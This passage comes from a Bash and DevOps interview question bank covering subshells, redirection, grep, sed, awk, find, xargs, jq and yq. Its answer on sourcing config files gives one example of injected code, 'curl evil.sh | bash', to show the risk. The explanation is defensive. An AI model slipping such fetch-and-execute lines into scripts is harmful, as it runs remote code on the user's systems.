`<(cmd)` runs `cmd` and substitutes a path (like `/dev/fd/63`) from which its output can be read; `>(cmd)` gives a path that feeds `cmd`'s stdin.

```bash
diff <(ssh web1 cat /etc/nginx/nginx.conf) <(ssh web2 cat /etc/nginx/nginx.conf)
comm -13 <(sort expected_users.txt) <(cut -d: -f1 /etc/passwd | sort)
while read -r pod; do ...; done < <(kubectl get pods -o name)   # loop in current shell
exec > >(tee -a "$log") 2>&1                                    # log everything
```

It is Bash/zsh only. Under `sh` (dash) you get `Syntax error: "(" unexpected`.

</details>

### Q107. What is a subshell, and which constructs create one? 🟡

<details>
<summary><b>Answer</b></summary>

A subshell is a forked copy of the shell; changes to variables, `cd`, `set` options and traps inside it do not affect the parent. Created by:

- `( commands )`
- command substitution `$(...)`
- each part of a pipeline (except the last with `lastpipe`)
- background jobs `cmd &`
- process substitution `<(...)`

```bash
( cd /tmp && tar -czf /backup/tmp.tgz . )   # parent's directory unchanged
echo "$BASH_SUBSHELL"                       # 0 in parent, 1+ inside subshells
```

`{ commands; }` groups without a subshell (note the spaces and the final `;`).

</details>

### Q108. What is the difference between `( ... )` and `{ ...; }`? 🟢

<details>
<summary><b>Answer</b></summary>

Both group commands so you can redirect or chain them as one unit. `( )` runs in a subshell (isolated state, extra fork). `{ ...; }` runs in the current shell (variables and `exit` affect the script).

```bash
{ echo "== disk =="; df -h; echo "== mem =="; free -m; } > report.txt
[[ -f $cfg ]] || { echo "missing $cfg" >&2; exit 1; }   # exit the script
[[ -f $cfg ]] || ( echo "missing" >&2; exit 1 )         # exits only the subshell!
```

</details>

### Q109. How do you redirect all output of an entire script to a log file while still seeing it? 🟡

<details>
<summary><b>Answer</b></summary>

```bash
log=/var/log/deploy/deploy-$(date +%F).log
exec > >(tee -a "$log") 2>&1
echo "this goes to the terminal and the log"
```

`exec` with only redirections applies them to the rest of the script. A caveat: `tee` runs asynchronously, so the last lines may appear after the shell prompt returns. Under systemd, skip this and just write to stdout/stderr; journald captures it with timestamps.

</details>

### Q110. How do you open custom file descriptors with `exec`, and why would you? 🔴

<details>
<summary><b>Answer</b></summary>

```bash
exec 3> /var/log/app/audit.log     # open fd 3 for writing
echo "deploy started by $SUDO_USER" >&3
exec 4< hosts.txt                  # open fd 4 for reading
while read -r h <&4; do ssh "$h" uptime; done
exec 3>&- 4<&-                     # close them
exec {lockfd}>/run/lock/job.lock   # Bash 4.1+: let Bash pick a free fd number
flock -n "$lockfd" || exit 0
```

Uses: a separate audit stream, reading a file while the loop body uses stdin, holding a `flock` lock, and `BASH_XTRACEFD` to send `set -x` output to its own file.

</details>

### Q111. What is `/dev/null`, `/dev/stdin`, `/dev/fd/N` and `/dev/tcp/host/port`? 🟡

<details>
<summary><b>Answer</b></summary>

- `/dev/null` discards writes and returns EOF on reads.
- `/dev/stdin`, `/dev/stdout`, `/dev/stderr`, `/dev/fd/N` refer to the process's file descriptors (handy for tools that only accept a filename).
- `/dev/tcp/HOST/PORT` and `/dev/udp/HOST/PORT` are **Bash** pseudo-files that open a socket, useful when `nc` is not installed:

```bash
if timeout 3 bash -c '</dev/tcp/db.internal/5432' 2>/dev/null; then
  echo "postgres port open"
fi
```

`/dev/tcp` is a Bash feature (it may be disabled at compile time on some distros), not a real device.

</details>

### Q112. How do you read user input with a timeout and a default value? 🟢

<details>
<summary><b>Answer</b></summary>

```bash
read -r -t 10 -p "Proceed with prod deploy? [y/N] " answer || answer=n
case ${answer,,} in
  y|yes) deploy ;;
  *)     echo "aborted"; exit 1 ;;
esac
```

`-t` returns a status greater than 128 on timeout. In CI or cron there is no terminal; check with `[[ -t 0 ]]` and require a `--yes` flag instead of prompting.

</details>

### Q113. What does `tee` do and how do you write to a root-owned file with `sudo`? 🟡

<details>
<summary><b>Answer</b></summary>

`tee` copies stdin to stdout and to one or more files (`-a` appends). `sudo echo x > /etc/file` fails because the redirection is done by your unprivileged shell, not by `sudo`.

```bash
echo 'vm.max_map_count=262144' | sudo tee /etc/sysctl.d/99-es.conf >/dev/null
sudo tee -a /etc/hosts >/dev/null <<'EOF'
10.0.1.10 db.internal
EOF
```

</details>

### Q114. How do you check whether a script is running interactively or with a terminal? 🟡

<details>
<summary><b>Answer</b></summary>

```bash
[[ -t 0 ]] && echo "stdin is a terminal"
[[ -t 1 ]] && echo "stdout is a terminal (colours OK)"
[[ $- == *i* ]] && echo "interactive shell"

if [[ -t 1 ]]; then RED=$'\e[31m' RESET=$'\e[0m'; else RED='' RESET=''; fi
```

Disable colours and progress bars when stdout is not a terminal, so logs in CI and journald stay clean. Honour `NO_COLOR` if set.

</details>

### Q115. How do you run a group of commands with a different environment without affecting the script? 🟡

<details>
<summary><b>Answer</b></summary>

```bash
AWS_PROFILE=prod AWS_REGION=ap-south-1 aws s3 ls          # one command
env -i PATH=/usr/bin:/bin HOME="$HOME" ./build.sh          # clean environment
( export KUBECONFIG=~/.kube/prod; kubectl get nodes; kubectl get pods -A )   # subshell
```

The `VAR=value cmd` prefix does not work for builtins in all cases and does not apply to commands after a pipe. `env -i` is a great way to reproduce "works in my shell, fails in cron" issues.

</details>

### Q116. What limits the size of a command line, and which patterns avoid hitting it? 🔴

<details>
<summary><b>Answer</b></summary>

The kernel limits the combined size of arguments and environment for `execve()` (`getconf ARG_MAX`, often 2 MB, with a per-argument limit of 128 KB). `rm $(find . -name '*.tmp')` or `rm *.log` in a directory with 500,000 files fails with `Argument list too long`.

```bash
find /var/tmp/app -name '*.tmp' -delete                 # no argv at all
find /var/tmp/app -name '*.tmp' -exec rm -- {} +         # batches arguments
find /var/tmp/app -name '*.tmp' -print0 | xargs -0 rm -- # batches arguments
```

Builtins like `printf '%s\0' *` are not subject to the limit, because no `exec` happens.

</details>

### Q117. How do you safely create temporary files and directories? 🔴

<details>
<summary><b>Answer</b></summary>

```bash
tmpfile=$(mktemp)                              # /tmp/tmp.XXXXXXXXXX, mode 0600
tmpdir=$(mktemp -d -t deploy.XXXXXX)           # unique dir under $TMPDIR or /tmp
partial=$(mktemp "$dest_dir/.partial.XXXXXX")  # same filesystem as the target
trap 'rm -rf -- "$tmpfile" "$tmpdir"' EXIT
```

`mktemp` creates the file atomically with a random name and private permissions. Predictable names like `/tmp/backup.$$` let another local user pre-create a symlink and make your root script overwrite `/etc/shadow`. Create the temp file in the destination directory when you plan to `mv` it, so the rename is atomic.

</details>

### Q118. How do you write a file atomically so readers never see a half-written version? 🔴

<details>
<summary><b>Answer</b></summary>

Write to a temp file on the **same filesystem**, flush it, then `mv` it over the target. `rename(2)` is atomic within a filesystem: readers see either the old or the new file.

```bash
tmp=$(mktemp "/etc/nginx/conf.d/.upstreams.XXXXXX")
generate_upstreams > "$tmp"
nginx -t -c /etc/nginx/nginx.conf || { rm -f "$tmp"; exit 1; }   # validate first
chmod 0644 "$tmp"
mv -f -- "$tmp" /etc/nginx/conf.d/upstreams.conf
systemctl reload nginx
```

`mv` across filesystems (e.g. from `/tmp` to `/etc`) becomes copy-then-delete and is not atomic. The same pattern applies to symlink switches: `ln -sfn new current.tmp && mv -T current.tmp current`.

</details>

### Q119. What does `timeout` do and how do you use it in scripts? 🟢

<details>
<summary><b>Answer</b></summary>

`timeout DURATION cmd` runs `cmd` and sends `SIGTERM` if it is still running after DURATION; it exits with 124 on timeout.

```bash
timeout 30s pg_isready -h db.internal || die "database not ready"
timeout -k 10s 5m ./migrate.sh     # SIGTERM at 5m, SIGKILL 10s later if still alive
rc=0; timeout 10 curl -fsS "$url" || rc=$?
(( rc == 124 )) && echo "timed out"
```

Every network call in an unattended script needs a timeout, either `timeout` or the tool's own (`curl --max-time`, `ssh -o ConnectTimeout=5`).

</details>

### Q120. What is the difference between `source`-ing a config file and parsing it? 🔴

<details>
<summary><b>Answer</b></summary>

`source app.conf` executes the file as Bash. Anyone who can write it can run code as the script's user, often root (`DB_HOST=x; curl evil.sh | bash`). Sourcing is fine for files only root can write (check owner and mode). For anything else, parse `KEY=VALUE` lines with an allow-list:

```bash
while IFS='=' read -r key value; do
  [[ $key =~ ^[A-Z_][A-Z0-9_]*$ ]] || continue
  [[ $key == APP_* ]] || continue        # only our namespace
  printf -v "$key" '%s' "$value"         # assigns without evaluating
done < /etc/app/app.conf
```

`printf -v` assigns the literal value, so `$(...)` in the file stays text.

</details>

### Q121. How does `exec 2>>` or `BASH_XTRACEFD` help separate debug output from normal output? 🔴

<details>
<summary><b>Answer</b></summary>

`set -x` writes traces to stderr by default, mixing them with real errors. Bash can send trace output to a dedicated fd:

```bash
exec {xfd}>>/var/log/deploy/trace.log
BASH_XTRACEFD=$xfd
PS4='+ ${BASH_SOURCE##*/}:${LINENO}:${FUNCNAME[0]:-main}: '
set -x
```

Now stderr contains only real errors (and goes to the alerting pipeline), while the trace file has every command with file, line and function. Remember that traces include expanded secrets; wrap sensitive sections in `set +x` and `set -x`.

</details>

### Q122. What is `coproc` and when would you use it? 🔴

<details>
<summary><b>Answer</b></summary>

`coproc` starts a background process with two-way pipes: you write to its stdin and read its stdout via file descriptors in an array.

```bash
coproc BC { bc -l; }
echo "scale=4; 22/7" >&"${BC[1]}"
read -r result <&"${BC[0]}"
echo "$result"           # 3.1428
```

It is rare in DevOps scripts; it suits long-lived helpers (a `bc` calculator, a persistent `psql` session) where starting a new process per query is too slow. If you need this often, the task has probably outgrown Bash.

</details>

---

## Text processing: grep, sed, awk, cut, sort, uniq

<!-- DEVOPS-SHACK:SECTION -->
> 🎥 **Learn this hands-on with DevOps Shack** → [YouTube @devopsshack](https://www.youtube.com/@devopsshack) · [Hindi @shackverse](https://www.youtube.com/@shackverse) · [Courses at devopsshack.com](https://devopsshack.com)

### Q123. What are the most useful `grep` flags? 🟢

<details>
<summary><b>Answer</b></summary>

| Flag | Purpose |
|---|---|
| `-i` | ignore case |
| `-v` | invert match |
| `-c` | count matching lines |
| `-n` | show line numbers |
| `-o` | print only the matched part |
| `-l` / `-L` | list files with / without matches |
| `-r` / `-R` | recursive (`-R` follows symlinks) |
| `-E` / `-F` / `-P` | extended regex / fixed string / Perl regex (GNU) |
| `-w` / `-x` | whole word / whole line |
| `-A n` `-B n` `-C n` | lines after / before / around |
| `-q` | quiet, exit status only |
| `-m n` | stop after n matches |

```bash
grep -rnE --include='*.yaml' 'image: .*:latest' k8s/
```

Exit status: 0 match, 1 no match, 2 error. Under `set -e`, `grep` finding nothing exits your script.

</details>

### Q124. What is the difference between basic, extended and Perl regular expressions in grep? 🟡

<details>
<summary><b>Answer</b></summary>

- BRE (`grep`): `?`, `+`, `{}`, `|`, `()` are literal unless backslashed (`\+`, `\{3\}`, `\|`).
- ERE (`grep -E`): those are operators directly.
- PCRE (`grep -P`, GNU only): adds `\d`, `\s`, lazy quantifiers, lookarounds.

```bash
grep -E '^[0-9]{1,3}(\.[0-9]{1,3}){3}$' ips.txt
grep -oP '(?<=request_id=)[a-f0-9-]+' app.log      # lookbehind
grep -F '[ERROR]' app.log                           # brackets literal, fastest
```

`\d` does **not** work in `grep -E`; use `[0-9]`. macOS grep has no `-P`.

</details>

### Q125. What are the core `sed` commands you use in automation? 🟢

<details>
<summary><b>Answer</b></summary>

```bash
sed 's/old/new/'            # first match per line
sed 's/old/new/g'           # all matches
sed -n '5,10p'              # print only lines 5-10
sed '/^#/d; /^$/d'          # delete comments and blank lines
sed -i.bak 's/^LogLevel .*/LogLevel INFO/' app.conf   # edit in place, keep backup
sed -E 's/([0-9]+)ms/\1 ms/g'                         # ERE with capture group
sed '/\[mysqld\]/a max_connections = 500' my.cnf      # append after match (GNU)
sed 's|/var/www|/srv/www|g'                           # alternate delimiter for paths
```

`sed` is line-oriented: perfect for substitutions and filtering, awkward for multi-line or column logic (use `awk`).

</details>

### Q126. Why does `sed -i` behave differently on macOS and Linux? 🟡

<details>
<summary><b>Answer</b></summary>

GNU sed's `-i` takes an optional, attached suffix (`-i` or `-i.bak`). BSD/macOS sed requires a suffix argument, so `sed -i 's/a/b/' f` treats the expression as the suffix and the filename as the script: `sed: 1: "f": invalid command code f`.

```bash
sed -i.bak 's/a/b/' f && rm f.bak   # works on both
sed -i '' 's/a/b/' f                # macOS only
```

In CI and containers we are on GNU sed; on laptops, install `gnu-sed` (`gsed`) or use the portable form.

</details>

### Q127. How do you use variables inside a `sed` expression safely? 🔴

<details>
<summary><b>Answer</b></summary>

Use double quotes so the variable expands, a delimiter that cannot appear in the value, and escape special characters in the replacement (`&`, `\`, the delimiter).

```bash
new_image="registry.example.com/api:1.4.2"
sed -i "s|^\(\s*image:\).*|\1 ${new_image}|" deploy.yaml

escape_sed_repl() { printf '%s' "$1" | sed 's/[&|\\]/\\&/g'; }
val=$(escape_sed_repl "$user_value")
sed -i "s|^PASSWORD=.*|PASSWORD=${val}|" app.env
```

For structured files, prefer a structural tool: `yq -i '.spec.template.spec.containers[0].image = strenv(IMG)'` for YAML, `jq` for JSON.

</details>

### Q128. What is the structure of an `awk` program? 🟢

<details>
<summary><b>Answer</b></summary>

`awk 'pattern { action }' file`: for each input line (record), split into fields `$1..$NF` (by whitespace or `-F`), and run the action when the pattern is true. `BEGIN` runs before input, `END` after.

```bash
awk -F: '$3 >= 1000 && $7 !~ /nologin/ {print $1, $6}' /etc/passwd
awk '{bytes += $10} END {printf "%.1f MB\n", bytes / 1024 / 1024}' access.log
awk 'NR > 1 && $5+0 > 80 {print $6, $5}' <(df -P)
```

Built-ins worth knowing: `NR` (record number), `NF` (field count), `$NF` (last field), `FS`/`OFS`, `FILENAME`.

</details>

### Q129. How do you count occurrences per key with `awk` associative arrays? 🟡

<details>
<summary><b>Answer</b></summary>

```bash
# Requests per status code
awk '{count[$9]++} END {for (c in count) print c, count[c]}' access.log | sort -k2,2nr

# 5xx per upstream, and error ratio
awk '{total++; if ($9 ~ /^5/) err[$NF]++}
     END {for (u in err) printf "%s %d (%.2f%%)\n", u, err[u], 100*err[u]/total}' access.log
```

`for (k in arr)` order is unspecified; sort the output. One `awk` pass replaces `grep | cut | sort | uniq -c` chains and is far faster on multi-GB logs.

</details>

### Q130. How do you pass shell variables into `awk`? 🔴

<details>
<summary><b>Answer</b></summary>

Use `-v`, never splice a variable into the program text.

```bash
threshold=90
df -P | awk -v t="$threshold" 'NR > 1 {sub(/%/, "", $5); if ($5+0 >= t) print $6, $5"%"}'

ENVIRON_VAR=prod awk 'BEGIN {print ENVIRON["ENVIRON_VAR"]}'
```

`awk "{print \$$col}"` works but is fragile, and splicing untrusted input into awk code is code injection (awk can run `system()`). Note that `-v` processes backslash escapes; use `ENVIRON[]` for raw values.

</details>

### Q131. What does `cut` do, and when do you prefer `awk` instead? 🟢

<details>
<summary><b>Answer</b></summary>

`cut` extracts fields by a single-character delimiter (`-d`, `-f`) or by character positions (`-c`).

```bash
cut -d: -f1,7 /etc/passwd
cut -d, -f2- users.csv      # field 2 to the end
cut -c1-19 app.log          # timestamp prefix
```

`cut` treats every delimiter as a field boundary, so runs of spaces (like `ps` or `df` output) produce empty fields. `awk` splits on runs of whitespace by default, so for whitespace-aligned output use `awk '{print $2}'`.

</details>

### Q132. How do you sort by a specific column, numerically, and in reverse? 🟢

<details>
<summary><b>Answer</b></summary>

```bash
sort -t, -k3,3n data.csv          # field 3, numeric, comma-separated
sort -k5,5nr report.txt           # field 5 numeric, descending
du -sh /var/* | sort -h           # human sizes: 512K < 3M < 2G
sort -u ips.txt                   # unique lines
sort -k2,2 -k1,1n file            # by field 2, then field 1 numeric
sort -V versions.txt              # version order: 1.9 < 1.10
```

Always give the end field (`-k3,3`); `-k3` means "from field 3 to the end of line". Set `LC_ALL=C` for byte-order sorting that is fast and identical on every machine.

</details>

### Q133. What does `uniq` do, and why do you almost always sort first? 🟢

<details>
<summary><b>Answer</b></summary>

`uniq` removes or counts **adjacent** duplicate lines. Without sorting, `a b a` stays `a b a`.

```bash
sort ips.txt | uniq -c | sort -rn | head    # top talkers
sort list.txt | uniq -d                     # only duplicated lines
sort list.txt | uniq -u                     # only lines that appear once
```

`sort -u` is enough for plain de-duplication; use `uniq -c` when you need counts.

</details>

### Q134. How do you extract the top 10 client IPs from an Nginx access log? 🟢

<details>
<summary><b>Answer</b></summary>

```bash
awk '{print $1}' /var/log/nginx/access.log | sort | uniq -c | sort -rn | head -n 10
```

Explain each stage: `awk` extracts field 1 (client IP in the combined format), `sort` groups identical IPs, `uniq -c` counts, `sort -rn` orders by count descending, `head` keeps 10. Behind a load balancer, field 1 is the LB's IP; read the `X-Forwarded-For` field from your log format instead.

</details>

### Q135. What do `tr`, `wc`, `head`, `tail`, `paste` and `column` do? 🟡

<details>
<summary><b>Answer</b></summary>

```bash
tr '[:upper:]' '[:lower:]' < f       # translate characters
tr -d '\r' < win.txt > unix.txt      # delete characters
tr -s ' ' < f                        # squeeze repeated spaces
wc -l < f                            # line count (no filename)
head -n 20 f; tail -n 50 f; tail -F /var/log/app.log   # -F follows across rotation
paste -sd, hosts.txt                 # join lines with commas
column -t -s, data.csv               # align CSV as a table
```

`tail -F` (capital) reopens the file after log rotation; `tail -f` keeps reading the old, renamed file.

</details>

### Q136. How do `comm`, `diff` and `join` help compare lists? 🟡

<details>
<summary><b>Answer</b></summary>

```bash
comm -23 <(sort expected.txt) <(sort actual.txt)   # only in expected (missing)
comm -13 <(sort expected.txt) <(sort actual.txt)   # only in actual (unexpected)
diff -u old.conf new.conf                          # unified diff for humans
join -t, <(sort -t, -k1,1 users.csv) <(sort -t, -k1,1 teams.csv)   # SQL-style join on field 1
```

`comm` and `join` require sorted input with the same collation; use `LC_ALL=C` on both sides. A typical use: comparing the list of IAM users against an approved list.

</details>

### Q137. How do you print lines between two patterns with `sed` and `awk`? 🟡

<details>
<summary><b>Answer</b></summary>

```bash
sed -n '/^\[mysqld\]/,/^\[/p' my.cnf                 # inclusive range
awk '/BEGIN CERT/,/END CERT/' bundle.pem
awk '/^\[mysqld\]/{f=1; next} /^\[/{f=0} f' my.cnf    # contents only, without markers
```

Range patterns turn on at the first pattern and off after the second. If the end pattern never appears, they print to the end of the file.

</details>

### Q138. How do you extract a value from `key=value` or `key: value` lines? 🟢

<details>
<summary><b>Answer</b></summary>

```bash
grep -oP '^PORT=\K.*' app.env                # GNU grep, \K drops the prefix
awk -F= '$1 == "PORT" {print $2}' app.env
sed -n 's/^PORT=//p' app.env
awk -F': *' '$1 == "Version" {print $2}' <(dpkg -s nginx)
```

Anchor the key (`^PORT=`) so `EXPORT=` or `SUPPORT_PORT=` does not match. For real YAML, JSON or INI use `yq`, `jq` or `crudini`.

</details>

### Q139. How do you handle multi-gigabyte log files efficiently with these tools? 🔴

<details>
<summary><b>Answer</b></summary>

- `LC_ALL=C` speeds up `grep` and `sort` dramatically by avoiding locale-aware comparisons.
- Filter early: put `grep -F` (fixed string, fastest) first, then process fewer lines.
- One `awk` pass instead of several piped tools.
- Read compressed logs directly: `zgrep`, `zcat f.gz | awk ...`, `zstdcat`.
- `sort -S 2G --parallel=4 -T /data/tmp` for large sorts (memory buffer, threads, temp dir on a big disk).
- `grep -m1` or `awk '... {print; exit}'` to stop at the first match.

```bash
LC_ALL=C zgrep -F ' 502 ' access.log.*.gz | awk '{print $7}' | LC_ALL=C sort | uniq -c | sort -rn | head
```

</details>

### Q140. How do you replace text across many files safely? 🟡

<details>
<summary><b>Answer</b></summary>

```bash
grep -rlZ --include='*.yaml' 'registry.old.io' k8s/ |
  xargs -0 sed -i 's|registry\.old\.io|registry.new.io|g'
git diff --stat           # review before committing
```

`grep -l` lists only files that need changes, so unrelated files keep their mtime. `-Z`/`-0` handle odd filenames. Escape `.` in the pattern (it means "any character" in regex). Run it in a Git working tree so you can review and revert.

</details>

### Q141. What are POSIX character classes and why use them? 🟡

<details>
<summary><b>Answer</b></summary>

Classes like `[[:digit:]]`, `[[:alpha:]]`, `[[:alnum:]]`, `[[:space:]]`, `[[:upper:]]` and `[[:punct:]]` work in `grep`, `sed`, `awk`, `tr` and Bash patterns, and respect the locale.

```bash
grep -E '^[[:space:]]*#' f          # comment lines with optional indentation
tr -cd '[:alnum:]._-' <<<"$name"    # keep only safe characters
[[ $v == +([[:digit:]]) ]]          # extglob: only digits
```

Ranges like `[a-z]` can match unexpected characters in some locales; classes (or `LC_ALL=C`) avoid that.

</details>

### Q142. How do you strip ANSI colour codes or carriage returns from tool output? 🟢

<details>
<summary><b>Answer</b></summary>

```bash
sed -E 's/\x1B\[[0-9;]*[A-Za-z]//g' ci.log > clean.log
tr -d '\r' < output.txt
kubectl logs pod --no-color 2>/dev/null || kubectl logs pod | sed -E 's/\x1B\[[0-9;]*m//g'
```

Prefer turning colours off at the source (`--no-color`, `NO_COLOR=1`, `TERM=dumb`) so log parsers and alert rules see plain text.

</details>

### Q143. How do you do floating-point math in shell scripts? 🟡

<details>
<summary><b>Answer</b></summary>

Bash only does integers. Use `awk` (always available) or `bc`.

```bash
ratio=$(awk -v e="$errors" -v t="$total" 'BEGIN {printf "%.2f", (t ? 100*e/t : 0)}')
echo "scale=3; 10/3" | bc               # 3.333
if awk -v r="$ratio" 'BEGIN {exit !(r > 5.0)}'; then alert "error rate ${ratio}%"; fi
```

The last line shows the trick for float comparisons: awk exits 0 when the condition is true.

</details>

### Q144. How do you parse a log timestamp and filter the last N minutes? 🔴

<details>
<summary><b>Answer</b></summary>

Convert both sides to epoch seconds and compare numbers.

```bash
since=$(date -d '15 minutes ago' +%s)          # GNU date
journalctl -u nginx --since '15 min ago'       # easiest when logs are in the journal

# Nginx: [09/Nov/2026:14:23:01 +0000] -> GNU awk mktime
gawk -v since="$since" '
  { split(substr($4, 2), t, /[\/:]/)
    m = (index("JanFebMarAprMayJunJulAugSepOctNovDec", t[2]) + 2) / 3
    ts = mktime(t[3]" "m" "t[1]" "t[4]" "t[5]" "t[6])
    if (ts >= since) print }' /var/log/nginx/access.log
```

`mktime` is a gawk extension; mawk on Debian/Ubuntu does not have it. Logging in ISO 8601 (`2026-11-09T14:23:01Z`) makes this a plain string comparison.

</details>

### Q145. What is the difference between `grep -c` and `grep | wc -l`, and between `grep -o | wc -l`? 🟡

<details>
<summary><b>Answer</b></summary>

`grep -c ERROR f` and `grep ERROR f | wc -l` both count **lines** that match. `grep -o ERROR f | wc -l` counts **occurrences**, since a line with two matches prints two lines. `grep -c` is a single process and returns exit status 1 when the count is 0, which matters under `set -e`:

```bash
errors=$(grep -c ERROR app.log || true)
```

</details>

### Q146. How do you de-duplicate lines while keeping the original order? 🟡

<details>
<summary><b>Answer</b></summary>

```bash
awk '!seen[$0]++' hosts.txt
```

`seen[$0]++` is 0 (false) the first time a line appears, so `!` makes it true and awk prints it; later occurrences are skipped. `sort -u` also de-duplicates but loses order. Use it for `PATH`-like lists: `PATH=$(printf '%s' "$PATH" | awk -v RS=: -v ORS=: '!s[$0]++'); PATH=${PATH%:}`.

</details>

---

## find, xargs, jq and yq

<!-- DEVOPS-SHACK:SECTION -->
> 🎥 **Learn this hands-on with DevOps Shack** → [YouTube @devopsshack](https://www.youtube.com/@devopsshack) · [Hindi @shackverse](https://www.youtube.com/@shackverse) · [Courses at devopsshack.com](https://devopsshack.com)

### Q147. What are the most useful `find` predicates for operations work? 🟢

<details>
<summary><b>Answer</b></summary>

```bash
find /var/log/app -type f -name '*.log' -mtime +14       # older than 14 days
find / -xdev -type f -size +500M 2>/dev/null              # big files, stay on this filesystem
find /srv -type f -perm -o+w                              # world-writable files
find /home -nouser -o -nogroup                            # orphaned files
find . -maxdepth 1 -type d -name 'release-*'              # do not recurse
find /etc -newer /var/run/last-deploy -type f             # changed since a marker
find /tmp -type f -mmin +60 -user www-data                # older than 60 minutes
```

Quote patterns (`'*.log'`) so the shell does not expand them before `find` sees them.

</details>

### Q148. What is the difference between `-exec cmd {} \;`, `-exec cmd {} +` and `-delete`? 🟡

<details>
<summary><b>Answer</b></summary>

- `-exec cmd {} \;` runs `cmd` once **per file**: slow for thousands of files.
- `-exec cmd {} +` passes as many files as fit into one command line, like `xargs`: fast.
- `-delete` removes files internally with no process at all, and implies `-depth`.

```bash
find /var/log/app -name '*.log' -mtime +7 -exec gzip -- {} +
find /var/log/app -name '*.gz' -mtime +30 -delete
find /srv/app/releases -mindepth 1 -maxdepth 1 -type d -mtime +10 -exec rm -rf -- {} +
```

Put `-delete` **last**: `find . -delete -name '*.tmp'` deletes everything before the name test is applied.

</details>

### Q149. How does `find` evaluate `-o` (OR) and why do you need parentheses? 🔴

<details>
<summary><b>Answer</b></summary>

Predicates are joined by an implicit `-a` (AND), which binds tighter than `-o`. Actions apply only to the branch they are in.

```bash
find . -name '*.log' -o -name '*.tmp' -delete         # deletes only *.tmp!
find . \( -name '*.log' -o -name '*.tmp' \) -delete   # deletes both

# Skip directories with -prune
find . -path ./node_modules -prune -o -name '*.js' -print
```

Escape the parentheses so the shell does not interpret them, and keep spaces around them. Without an explicit `-print`, the `-prune` example also prints `./node_modules`.

</details>

### Q150. What does `xargs` do, and which flags matter? 🟡

<details>
<summary><b>Answer</b></summary>

`xargs` reads items from stdin and runs a command with them as arguments, batching to stay under the argument limit.

| Flag | Purpose |
|---|---|
| `-0` | items are NUL-separated (pair with `find -print0`, `grep -Z`) |
| `-n N` | at most N items per command |
| `-I {}` | replace `{}` with each item (implies one item per command) |
| `-P N` | run up to N commands in parallel |
| `-r` | GNU: do not run the command if input is empty |
| `-t` | print each command before running it |

```bash
find . -name '*.png' -print0 | xargs -0 -P 4 -n 20 optipng -quiet
kubectl get ns -o name | xargs -r -n1 -I{} kubectl get pods -n {} --no-headers
```

Without `-0`, `xargs` splits on whitespace and treats quotes specially, so filenames with spaces or apostrophes break.

</details>

### Q151. Why is `find | xargs rm` dangerous and what is the safe form? 🟡

<details>
<summary><b>Answer</b></summary>

Default `xargs` splits on spaces and newlines, so `/data/old report.csv` becomes two arguments, and a crafted name like `x /etc/passwd` could delete something unrelated. With empty input, GNU `xargs` still runs `rm` once with no arguments (harmless for `rm`, but not for every command).

```bash
find /data -name '*.csv' -mtime +30 -print0 | xargs -0 -r rm -f --
# or simply
find /data -name '*.csv' -mtime +30 -delete
```

`--` stops `rm` from treating a file named `-rf` as options.

</details>

### Q152. What is `jq` and what are the filters you use every day? 🟢

<details>
<summary><b>Answer</b></summary>

`jq` is a command-line JSON processor.

```bash
jq '.' file.json                        # pretty-print and validate
jq -r '.metadata.name' pod.json         # raw string, no quotes
jq '.items[] | .metadata.name'          # iterate an array
jq '.items | length'                    # count
jq '.items[] | select(.status.phase != "Running") | .metadata.name'
jq -r '.Reservations[].Instances[] | [.InstanceId, .State.Name] | @tsv'
jq '.spec.replicas = 3' deploy.json     # modify
jq -e '.ready == true' status.json      # exit 1 if false or null
```

`-r` (raw output) is what you want when the value feeds another command.

</details>

### Q153. How do you pass shell variables into `jq` safely? 🟡

<details>
<summary><b>Answer</b></summary>

Use `--arg` (string) and `--argjson` (JSON value). Never splice variables into the filter text, which breaks on quotes and is an injection risk.

```bash
jq --arg ns "$namespace" '.items[] | select(.metadata.namespace == $ns)'
jq --argjson n "$replicas" '.spec.replicas = $n' deploy.json
payload=$(jq -n --arg text "Deploy $version done: $msg" '{text: $text}')   # build JSON
curl -fsS -H 'Content-Type: application/json' --data-binary "$payload" "$SLACK_URL"
```

Building JSON with `jq -n --arg` guarantees correct escaping of quotes, backslashes and newlines in commit messages or error output.

</details>

### Q154. How do you handle missing keys, nulls and defaults in `jq`? 🟡

<details>
<summary><b>Answer</b></summary>

```bash
jq -r '.spec.replicas // 1'                 # default when null or missing
jq '.items[]?.name'                         # ? suppresses errors on non-iterable
jq -r '.tags // [] | .[]'                   # iterate safely even if null
jq 'has("status")'                          # key exists?
jq -e '.data.token' f.json >/dev/null || die "token missing"
```

Without `-e`, `jq` exits 0 even when the result is `null`, so `token=$(jq -r .token f)` silently gives the string `null`. Check for it: `[[ $token != null && -n $token ]]`.

</details>

### Q155. How do you transform JSON into CSV/TSV or group and aggregate with `jq`? 🔴

<details>
<summary><b>Answer</b></summary>

```bash
# TSV of pods: namespace, name, node
kubectl get pods -A -o json |
  jq -r '.items[] | [.metadata.namespace, .metadata.name, .spec.nodeName // "-"] | @tsv'

# Count pods per node
kubectl get pods -A -o json |
  jq -r '.items | group_by(.spec.nodeName) | map({node: .[0].spec.nodeName, pods: length}) | .[] | "\(.node)\t\(.pods)"'

# Sum EBS volume sizes
aws ec2 describe-volumes | jq '[.Volumes[].Size] | add'
```

`@csv` quotes strings properly; `@tsv` escapes tabs; `@sh` quotes values for safe use in shell commands.

</details>

### Q156. When should you use the AWS CLI's `--query` instead of piping to `jq`? 🟡

<details>
<summary><b>Answer</b></summary>

`--query` uses JMESPath and runs inside the CLI, so there is no extra dependency, and `--output text` gives tab-separated values ready for `read`.

```bash
aws ec2 describe-instances \
  --filters Name=tag:Env,Values=prod Name=instance-state-name,Values=running \
  --query 'Reservations[].Instances[].[InstanceId,PrivateIpAddress]' --output text |
  while read -r id ip; do echo "$id $ip"; done
```

Use `jq` for complex transformations, joins, or when the same script handles output from other tools. `kubectl` has a similar option with `-o jsonpath='{.items[*].metadata.name}'`.

</details>

### Q157. What is `yq`, and why does "which yq" matter? 🟡

<details>
<summary><b>Answer</b></summary>

Two different tools share the name:

- **mikefarah/yq** (Go, v4): jq-like syntax for YAML, JSON, XML, TOML, with in-place editing (`-i`) that preserves comments. This is the common one in DevOps.
- **kislyuk/yq** (Python): a wrapper that converts YAML to JSON and runs real `jq`.

```bash
yq --version          # "yq (https://github.com/mikefarah/yq/) version v4.x"
yq '.spec.replicas' deploy.yaml
yq -i '.spec.replicas = 3' deploy.yaml
```

Pin the exact tool and version in CI images, because scripts written for one fail with the other (and yq v3 syntax `yq r file key` fails in v4).

</details>

### Q158. How do you update a Kubernetes manifest's image with `yq` using a shell variable? 🟡

<details>
<summary><b>Answer</b></summary>

```bash
